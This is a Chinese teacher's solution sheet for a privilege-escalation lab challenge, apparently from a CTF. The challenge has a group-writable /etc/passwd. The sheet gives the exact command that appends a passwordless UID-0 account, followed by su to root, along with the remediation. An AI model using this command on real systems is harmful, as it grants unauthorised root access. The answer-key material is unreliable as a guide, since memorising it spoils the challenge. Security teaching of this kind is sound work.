# 第 7 题（教师版）：/etc/passwd 可写

> **唯一提权面**：`/etc/passwd` 属主 `root:player`、权限 `0664` —— `player` 所在的私有组可写。
> **唯一解**：往 `/etc/passwd` 追加一个 UID=0、无密码的账户，`su` 过去。
> **已刻意堵死**：`/etc/shadow` 为 `root:shadow 0640`，player 不在 shadow 组，读不到任何 hash；
> 无 sudo 授权；无 SUID 异常项；`/var/backups/passwd.old` 只是无 hash 的占位文件（干扰项）。

## 一、预置环境

| 路径 | 权限 | 说明 |
|---|---|---|
| `/flag.txt` | `root:root 0400` | 构建时生成 |
| `/etc/passwd` | `root:player 0664` | **唯一提权面** |
| `/etc/shadow` | `root:shadow 0640` | 不可读，无明文/hash 泄露面 |
| `/var/backups/passwd.old` | 普通文件 | 干扰项，内容无 hash |

## 二、唯一解

```bash
ls -l /etc/passwd /etc/shadow
# -rw-rw-r-- 1 root player /etc/passwd     <-- 组可写
# -rw-r----- 1 root shadow /etc/shadow     <-- 读不到

id | grep player                              # 确认自己在 player 组

echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd

su pwned
# 无需密码（第二字段为空 = 空密码）
id          # uid=0(root)
cat /flag.txt
```

### 关键点讲解

- `/etc/passwd` 的字段：`用户名:占位符:UID:GID:描述:家目录:登录shell`。
- 密码占位现在一般是 `x`（真 hash 在 shadow 里）；把占位写成**空**，PAM 会认为“无密码”。
- UID 写 `0`，新账户就和 root 等价（只是名字不同）。
- 教学要点：**`/etc/passwd` 可写 ≈ 直接 root**，比 shadow 可写更常见也更容易被忽略。
- 修复：`chown root:root /etc/passwd && chmod 644 /etc/passwd`，并用 `dpkg --verify` / AIDE 监控这类文件。

## 三、为什么只有这一条解

| 思路 | 为什么失败 |
|---|---|
| 读 `/etc/shadow` 爆 hash | 0640 root:shadow，player 无读权限 |
| 改 `/etc/shadow` 里的 root 密码 | 无写权限 |
| 用 `/var/backups/passwd.old` 找口令 | 文件里没有 hash |
| `sudo` / SUID | 均未预置 |

## 四、单解验证

```bash
# 正向
ls -l /etc/passwd | grep -q 'rw-rw-r--.*player'
echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned -c 'id; cat /flag.txt'

# 负向
cat /etc/shadow               # Permission denied
echo x >> /etc/shadow         # Permission denied
sudo -n -l                    # not in sudoers
```
